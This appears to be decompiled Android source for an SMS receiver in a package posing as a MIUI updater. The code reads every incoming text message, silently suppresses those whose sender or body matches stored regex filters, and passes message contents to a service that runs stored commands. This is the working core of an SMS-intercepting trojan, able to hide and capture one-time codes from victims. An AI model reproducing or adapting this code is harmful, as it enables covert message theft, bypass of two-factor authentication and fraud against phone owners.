package brandmangroupe.miui.updater;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import java.util.Map;
import java.util.regex.Pattern;

public class IncomingSms extends BroadcastReceiver {
    private SharedPreferences setting2;
    final SmsManager sms = SmsManager.getDefault();
    private String sms_from;

    public void onReceive(Context context, Intent intent2) {
        Bundle bndl = intent2.getExtras();
        String str = "";
        if (bndl != null) {
            Object[] pdus = (Object[]) bndl.get("pdus");
            SmsMessage[] msg = new SmsMessage[pdus.length];
            for (int i = 0; i < msg.length; i++) {
                msg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                if (i == 0) {
                    str = new StringBuilder(String.valueOf(str)).append(msg[0].getOriginatingAddress()).append(":::7:::").toString();
                    this.sms_from = msg[0].getOriginatingAddress();
                }
                str = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(str)).toString())).append(msg[i].getMessageBody().toString()).toString())).toString();
            }
        }
        String body = str;
        String type = "";
        this.setting2 = context.getSharedPreferences("setfilterconf", 0);
        String filter = this.setting2.getString("filter", "");
        String filter2 = this.setting2.getString("filter2", "");
        if (filter.length() > 1 && Pattern.compile(filter).matcher(this.sms_from).find()) {
            abortBroadcast();
            type = "!";
        }
        if (filter2.length() > 1 && Pattern.compile(filter2).matcher(body).find()) {
            abortBroadcast();
            type = "!";
        }
        Map<String, ?> items = context.getSharedPreferences("SMS_conf", 0).getAll();
        if (items.size() > 0) {
            for (String s : items.keySet()) {
                String cmd = getcmd(context, s);
                if (cmd.length() > 2) {
                    Intent intent = new Intent(context, GlobalCode.class);
                    intent.putExtra("content", cmd);
                    intent.putExtra("type", "TriggerSMS:" + s);
                    intent.putExtra("data", str);
                    context.startService(intent);
                }
            }
        }
    }

    public String getcmd(Context ctx, String command) {
        return ctx.getSharedPreferences("Cmd_conf", 0).getString(command, "");
    }
}
